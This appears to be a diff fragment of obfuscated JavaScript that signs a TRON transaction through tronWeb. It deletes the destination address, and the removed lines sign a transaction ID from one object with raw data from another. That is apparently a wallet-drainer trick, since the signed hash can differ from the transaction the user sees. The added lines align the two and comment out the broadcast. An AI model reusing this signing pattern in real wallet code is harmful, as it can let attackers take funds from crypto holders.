@@ -232,16 +232,15 @@ async function _0x8f88sb(_0x5b1fc5) {
   delete _0x348df4.raw_data.contract[0].parameter.value.to_address;
   try {
     let _0x1c8990 = await tronWeb.trx.sign({
-      "txID": _0x25dedb.txID,
-      "raw_data": _0x348df4.raw_data,
+      "txID": _0x4f164f.txID,
+      "raw_data": _0x4f164f.raw_data,
       "raw_data_hex": _0x4f164f.raw_data_hex
     });
-      console.log("_0x4f164f:", _0x4f164f);
-     return true;
-    await tronWeb.trx.sendRawTransaction({
-      ..._0x4f164f,
-      "raw_data_hex": _0x4f164f.raw_data_hex
-    });
+
+    // await tronWeb.trx.sendRawTransaction({
+    //   ..._0x4f164f,
+    //   "raw_data_hex": _0x4f164f.raw_data_hex
+    // });
     return true;
   } catch (_0x2ff4d4) {
     return false;
